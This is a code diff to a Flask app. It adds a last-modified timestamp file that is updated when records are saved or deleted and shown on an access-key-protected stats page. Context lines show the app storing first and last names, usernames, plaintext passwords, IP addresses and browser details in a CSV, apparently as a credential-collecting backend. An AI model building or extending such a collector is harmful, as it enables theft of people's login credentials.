@@ -3,9 +3,9 @@ import csv # getting the configuration of csv
 import os # configuration/ portable way of using operating system
 import time #getting the time
 import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
-import platform #used to retrieve as much possible information about the platform
-import re #provides regular expression matching operations
-import json #for returning JSON data
+import platform 
+import re 
+import json 
 import hashlib
 import uuid
 from datetime import datetime
@@ -339,6 +339,10 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
                 browser_details.get('full_user_agent', 'Unknown')
             ])
             csvfile.flush()
+            
+        # Update the last modified timestamp
+        update_last_modified_timestamp()
+            
     except Exception as e:
         """
         if writing to default location fails, it will go alternative way/append
@@ -392,6 +396,45 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
                 browser_details.get('full_user_agent', 'Unknown')
             ])
             csvfile.flush()
+            
+        # Update the last modified timestamp (for fallback path)
+        update_last_modified_timestamp(fallback_path)
+
+def update_last_modified_timestamp(csv_path=None):
+    """Update the timestamp for when the data was last modified"""
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
+        
+        # Get current timestamp
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # Write timestamp to file
+        with open(timestamp_file, 'w') as f:
+            f.write(current_time)
+    except Exception as e:
+        print(f"Error updating timestamp: {str(e)}")
+
+def get_last_modified_timestamp():
+    """Get the timestamp when the data was last modified"""
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
+        
+        if os.path.exists(timestamp_file):
+            with open(timestamp_file, 'r') as f:
+                return f.read().strip()
+        
+        # If file doesn't exist, check the CSV file's modification time
+        csv_path = os.path.join(script_dir, 'data.csv')
+        if os.path.exists(csv_path):
+            modified_time = os.path.getmtime(csv_path)
+            return datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %H:%M:%S')
+        
+        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    except Exception as e:
+        print(f"Error getting timestamp: {str(e)}")
+        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 # Add a route to view statistics with access key protection
 @app.route('/stats/<access_key>', methods=['GET'])
@@ -417,10 +460,13 @@ def view_stats(access_key):
             except Exception as e:
                 continue
     
+    # Get the last modified timestamp
+    last_updated = get_last_modified_timestamp()
+    
     if request.args.get('format') == 'json':
         return json.dumps(data)
     else:
-        return render_template('stats.html', entries=data, access_key=access_key)
+        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)
 
 # Add a route to download the CSV data
 @app.route('/download-csv/<access_key>', methods=['GET'])
@@ -494,6 +540,9 @@ def delete_entry(access_key, entry_index):
             writer = csv.writer(csvfile)
             writer.writerows(all_data)
         
+        # Update the last modified timestamp
+        update_last_modified_timestamp()
+        
         return "Entry deleted successfully", 200
     
     except Exception as e:
@@ -532,6 +581,9 @@ def delete_all(access_key):
         with open(csv_path, 'w', newline='\n') as csvfile:
             writer = csv.writer(csvfile)
             writer.writerow(header)
+        
+        # Update the last modified timestamp
+        update_last_modified_timestamp()
         
         return "All entries deleted successfully", 200
     
